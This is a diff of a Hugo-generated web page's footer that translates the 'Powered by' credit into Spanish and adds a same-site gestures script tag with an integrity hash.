-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -519,6 +533,11 @@
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
